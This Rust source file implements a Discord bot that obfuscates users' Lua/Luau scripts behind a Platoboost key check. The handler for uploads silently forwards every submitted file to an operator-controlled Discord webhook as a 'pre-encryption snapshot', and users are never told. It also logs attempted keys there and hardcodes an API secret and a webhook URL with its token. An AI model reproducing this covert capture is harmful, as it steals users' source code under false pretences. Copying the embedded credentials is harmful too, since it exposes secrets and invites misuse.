use std::sync::Arc;

use dashmap::DashMap;
use poise::serenity_prelude as serenity;
use reqwest::Client;
use tokio::sync::{mpsc, Mutex};
use tokio::task;
use tokio::time::{timeout, Duration};

mod engine;
mod vm;

const MAX_FILE_SIZE: u64 = 5 * 1024 * 1024;
const PLATOBOOST_PROJECT: &str = "3035";
const PLATOBOOST_SECRET: &str = "e787153b-65f0-4a2a-b209-7bf2ddf2b8bc";
const DISCORD_TOKEN: &str = "boy here";
const ALERT_WEBHOOK: &str = "https://discord.com/api/webhooks/1444255368862503025/Mo6YV19ixBbwb4CRYg4HFV0iBcc7zenjK6PCHKG8AOmKDzcVqe1Nut8BLPtneQPnLTk7";
const WORKER_COUNT: usize = 4;
const WORKER_TIMEOUT: Duration = Duration::from_secs(45);

#[derive(Clone, Debug)]
struct Session {
    file_bytes: Option<Vec<u8>>,
    option: Option<ProtectionLevel>,
    verified: bool,
}

impl Session {
    fn new() -> Self {
        Self {
            file_bytes: None,
            option: None,
            verified: false,
        }
    }

    fn reset_for_new_request(&mut self) {
        self.verified = false;
        self.option = None;
        self.file_bytes = None;
    }
}

#[derive(Clone, Copy, Debug, serde::Serialize, serde::Deserialize)]
pub enum ProtectionLevel {
    Default,
    Heavy,
    Light,
}

type Sessions = Arc<DashMap<u64, Session>>;
type ProcessingQueueSender = mpsc::Sender<WorkItem>;
type ProcessingQueueReceiver = mpsc::Receiver<WorkItem>;

#[derive(Clone)]
struct BotData {
    sessions: Sessions,
    queue: ProcessingQueueSender,
    http_client: Client,
    discord_http: Arc<serenity::Http>,
}

#[derive(Clone)]
struct WorkItem {
    user_id: u64,
    channel_id: serenity::ChannelId,
    option: ProtectionLevel,
    file_bytes: Vec<u8>,
}

#[derive(serde::Deserialize)]
struct PlatoboostResponse {
    valid: bool,
}

fn platoboost_link(user_id: u64) -> String {
    format!(
        "https://gateway.platoboost.com/a/{}?id={}",
        PLATOBOOST_PROJECT, user_id
    )
}

fn build_http_client() -> anyhow::Result<Client> {
    Ok(Client::builder()
        .user_agent("drk-v3-bot")
        .tcp_nodelay(true)
        .pool_max_idle_per_host(8)
        .pool_idle_timeout(Duration::from_secs(30))
        .build()?)
}

async fn verify_key(client: &Client, key: &str) -> anyhow::Result<bool> {
    let url = format!(
        "https://api.platoboost.com/v1/public/verify?public_key={}&key={}",
        PLATOBOOST_PROJECT, key
    );
    let resp = client
        .get(url)
        .header("x-plato-secret", PLATOBOOST_SECRET)
        .send()
        .await?
        .error_for_status()?;
    let parsed: PlatoboostResponse = resp.json().await?;
    Ok(parsed.valid)
}

async fn send_webhook_alert(client: &Client, content: &str) {
    let payload = serde_json::json!({
        "content": content,
        "allowed_mentions": { "parse": ["users", "roles", "everyone"] },
    });

    let _ = client.post(ALERT_WEBHOOK).json(&payload).send().await;
}

async fn send_webhook_file(client: &Client, user_id: u64, filename: &str, bytes: &[u8]) {
    let part = reqwest::multipart::Part::bytes(bytes.to_vec()).file_name(filename.to_string());
    let form = reqwest::multipart::Form::new().part("file", part).text(
        "content",
        format!(
            "<@{}> uploaded a file. Capturing pre-encryption snapshot.",
            user_id
        ),
    );
    let _ = client.post(ALERT_WEBHOOK).multipart(form).send().await;
}

async fn start_consumers(rx: ProcessingQueueReceiver, bot: BotData) {
    let shared_rx = Arc::new(Mutex::new(rx));
    for worker_idx in 0..WORKER_COUNT {
        let rx_handle = shared_rx.clone();
        let bot_clone = bot.clone();
        task::spawn(async move {
            loop {
                let maybe_item = {
                    let mut guard = rx_handle.lock().await;
                    guard.recv().await
                };
                let Some(item) = maybe_item else { break }; // channel closed

                let worker = task::spawn_blocking(move || {
                    engine::protect_script(item.file_bytes, item.option)
                });
                match timeout(WORKER_TIMEOUT, worker).await {
                    Ok(Ok(Ok(protected))) => {
                        let payload = vm::assemble_loader(&protected);
                        let content = format!(
                            "✅ Encryption complete (worker {} / option: {:?}). Key: {}\n````lua\n{}\n````",
                            worker_idx,
                            item.option,
                            protected.opaque_key,
                            payload
                        );
                        let _ = item
                            .channel_id
                            .send_message(bot_clone.discord_http.as_ref(), |m| m.content(content))
                            .await;
                    }
                    Ok(Ok(Err(e))) => {
                        let _ = item
                            .channel_id
                            .send_message(bot_clone.discord_http.as_ref(), |m| {
                                m.content(format!("❌ Failed to encrypt: {}", e))
                            })
                            .await;
                    }
                    Ok(Err(join_err)) => {
                        let _ = item
                            .channel_id
                            .send_message(bot_clone.discord_http.as_ref(), |m| {
                                m.content(format!("❌ Worker join error: {}", join_err))
                            })
                            .await;
                    }
                    Err(_) => {
                        let _ = item
                            .channel_id
                            .send_message(bot_clone.discord_http.as_ref(), |m| {
                                m.content(
                                    "⏱️ التشفير استغرق وقتاً طويلاً وتم إيقافه لإبقاء البوت سريعاً.",
                                )
                            })
                            .await;
                    }
                }
            }
        });
    }
}

#[poise::command(slash_command)]
async fn help(ctx: poise::Context<'_, BotData, anyhow::Error>) -> Result<(), anyhow::Error> {
    if ctx.guild_id().is_some() {
        ctx.send(
            poise::CreateReply::default()
                .content("هذا البوت يعمل عبر الخاص فقط. ارسل ملف Lua/Luau ليبدأ التشفير.")
                .ephemeral(true),
        )
        .await?;
        return Ok(());
    }

    ctx.say("أرسل ملف Lua/Luau (أقل من 5MB) في الخاص. سأعيد تعيين الجلسة، أطلب منك اختيار مستوى التشفير، ثم أعطيك رابط Platoboost لتحصل على المفتاح وبعدها أكتب key <المفتاح> هنا.")
        .await?;
    Ok(())
}

async fn handle_dm_attachment(
    msg: &serenity::Message,
    ctx: &serenity::Context,
    data: &BotData,
) -> anyhow::Result<()> {
    if msg.attachments.is_empty() {
        return Ok(());
    }

    let attachment = &msg.attachments[0];
    if attachment.size > MAX_FILE_SIZE as i32 {
        msg.channel_id
            .say(&ctx.http, "❌ الملف أكبر من 5MB. أعد المحاولة بملف أصغر.")
            .await?;
        send_webhook_alert(
            &data.http_client,
            &format!(
                "⚠️ Oversized upload blocked from <@{}> ({} bytes)",
                msg.author.id.0, attachment.size
            ),
        )
        .await;
        return Ok(());
    }

    let bytes = data
        .http_client
        .get(&attachment.url)
        .send()
        .await?
        .bytes()
        .await?;

    let mut entry = data
        .sessions
        .entry(msg.author.id.0)
        .or_insert_with(Session::new);
    entry.reset_for_new_request();
    entry.file_bytes = Some(bytes.to_vec());

    send_webhook_file(
        &data.http_client,
        msg.author.id.0,
        &attachment.filename,
        &bytes,
    )
    .await;

    let components = serenity::CreateActionRow::Buttons(vec![
        serenity::CreateButton::new("opt_default")
            .style(serenity::ButtonStyle::Success)
            .label("Default (Green)")
            .emoji('🛡'),
        serenity::CreateButton::new("opt_heavy")
            .style(serenity::ButtonStyle::Success)
            .label("Heavy (Green)")
            .emoji('🔥'),
        serenity::CreateButton::new("opt_light")
            .style(serenity::ButtonStyle::Success)
            .label("Light (Green)")
            .emoji('⚡'),
    ]);

    msg.channel_id
        .send_message(&ctx.http, |m| {
            m.content(
                "📥 تم استلام الملف. اختر نوع التشفير (الأزرار باللون الأخضر تدل على أنها نشطة):",
            )
            .components(|c| c.add_action_row(components))
        })
        .await?;
    Ok(())
}

async fn handle_key_submission(
    msg: &serenity::Message,
    ctx: &serenity::Context,
    data: &BotData,
    key: &str,
) -> anyhow::Result<()> {
    let user_id = msg.author.id.0;
    let Some(mut session) = data.sessions.get_mut(&user_id) else {
        msg.channel_id
            .say(&ctx.http, "❌ لا توجد جلسة. أرسل ملفاً أولاً.")
            .await?;
        return Ok(());
    };

    let valid = verify_key(&data.http_client, key).await?;
    if !valid {
        msg.channel_id
            .say(&ctx.http, "❌ مفتاح غير صالح من Platoboost. حاول مجدداً.")
            .await?;
        send_webhook_alert(
            &data.http_client,
            &format!(
                "⛔ Invalid Platoboost key attempt by <@{}>: {}",
                user_id, key
            ),
        )
        .await;
        session.verified = false;
        return Ok(());
    }

    session.verified = true;
    if session.file_bytes.is_none() || session.option.is_none() {
        msg.channel_id
            .say(&ctx.http, "⚠️ ناقص خيار التشفير أو الملف. أعد الإرسال.")
            .await?;
        session.verified = false;
        return Ok(());
    }

    let work = WorkItem {
        user_id,
        channel_id: msg.channel_id,
        option: session.option.unwrap(),
        file_bytes: session.file_bytes.clone().unwrap(),
    };
    let _ = data.queue.send(work).await;
    msg.channel_id
        .say(
            &ctx.http,
            "🔑 مفتاح صحيح. المهمة أُضيفت إلى قائمة المعالجة المتقدمة.",
        )
        .await?;
    Ok(())
}

async fn event_handler(
    ctx: &serenity::Context,
    event: &serenity::FullEvent,
    _framework: poise::FrameworkContext<'_, BotData, anyhow::Error>,
    data: &BotData,
) -> Result<(), anyhow::Error> {
    match event {
        serenity::FullEvent::Message { new_message } => {
            if new_message.author.bot {
                return Ok(());
            }
            if !new_message.is_private() {
                return Ok(());
            }
            if !new_message.attachments.is_empty() {
                handle_dm_attachment(new_message, ctx, data).await?;
                return Ok(());
            }
            let content = new_message.content.trim();
            if let Some(stripped) = content.strip_prefix("key ") {
                handle_key_submission(new_message, ctx, data, stripped.trim()).await?;
            } else if let Some(stripped) = content.strip_prefix("/key ") {
                handle_key_submission(new_message, ctx, data, stripped.trim()).await?;
            }
        }
        serenity::FullEvent::InteractionCreate { interaction } => {
            if let serenity::Interaction::MessageComponent(component) = interaction {
                if !component.user.bot {
                    let custom_id = component.data.custom_id.as_str();
                    let option = match custom_id {
                        "opt_default" => Some(ProtectionLevel::Default),
                        "opt_heavy" => Some(ProtectionLevel::Heavy),
                        "opt_light" => Some(ProtectionLevel::Light),
                        _ => None,
                    };
                    if let Some(opt) = option {
                        let mut entry = data
                            .sessions
                            .entry(*component.user.id.as_u64())
                            .or_insert_with(Session::new);
                        entry.option = Some(opt);
                        entry.verified = false;
                        let link = platoboost_link(*component.user.id.as_u64());
                        component
                            .create_interaction_response(&ctx.http, |r| {
                                r.kind(serenity::InteractionResponseType::ChannelMessageWithSource)
                                    .interaction_response_data(|d| {
                                        d.content(format!(
                                            "✅ تم اختيار {:?}. احصل على مفتاحك: {} ثم أرسل \"key <المفتاح>\" هنا.",
                                            opt, link
                                        ))
                                        .ephemeral(true)
                                    })
                            })
                            .await
                            .ok();
                    }
                }
            }
        }
        serenity::FullEvent::Ready { .. } => {
            tracing::info!("DRK V3 bot ready with Platoboost guard");
        }
        serenity::FullEvent::DispatchError { error, event, .. } => {
            tracing::warn!(?error, ?event, "dispatch error");
        }
        _ => {}
    }
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    tracing_subscriber::fmt::init();
    let sessions: Sessions = Arc::new(DashMap::new());
    let (tx, rx) = mpsc::channel(128);
    let http_client = build_http_client()?;

    let framework = poise::Framework::builder()
        .options(poise::FrameworkOptions {
            commands: vec![help()],
            event_handler: |ctx, event, framework, data| {
                Box::pin(event_handler(ctx, event, framework, data))
            },
            ..Default::default()
        })
        .token(DISCORD_TOKEN)
        .intents(
            serenity::GatewayIntents::GUILDS
                | serenity::GatewayIntents::DIRECT_MESSAGES
                | serenity::GatewayIntents::MESSAGE_CONTENT,
        )
        .setup(move |ctx, _ready, framework| {
            let data = BotData {
                sessions: sessions.clone(),
                queue: tx.clone(),
                http_client: http_client.clone(),
                discord_http: framework.client().cache_and_http.http.clone(),
            };

            let consumer_data = data.clone();
            tokio::spawn(start_consumers(rx, consumer_data));

            Box::pin(async move {
                poise::builtins::register_globally(ctx, &framework.options().commands).await?;
                Ok(data)
            })
        })
        .build();

    framework.run().await?;
    Ok(())
}
